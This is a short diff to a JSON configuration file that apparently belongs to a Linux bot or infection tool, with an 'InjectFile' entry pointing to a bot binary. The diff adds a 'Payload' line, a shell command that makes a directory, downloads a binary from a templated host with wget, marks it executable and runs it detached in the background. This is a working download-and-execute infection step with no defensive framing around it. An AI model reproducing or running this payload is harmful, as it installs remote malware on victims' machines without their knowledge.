@@ -20,7 +20,8 @@
 		"Logging": false
 	},
 	"InjectFile": {
-		"Linux": "./bin/linux/bot.bin"
+		"Linux": "./bin/linux/bot.bin",
+		"Payload": "mkdir jidaj; cd jidaj; wget -O dick.bin {host}; chmod +x dick.bin; ./dick.bin & disown"
 	},
 	"Proxy": {
 		"Useproxy": false
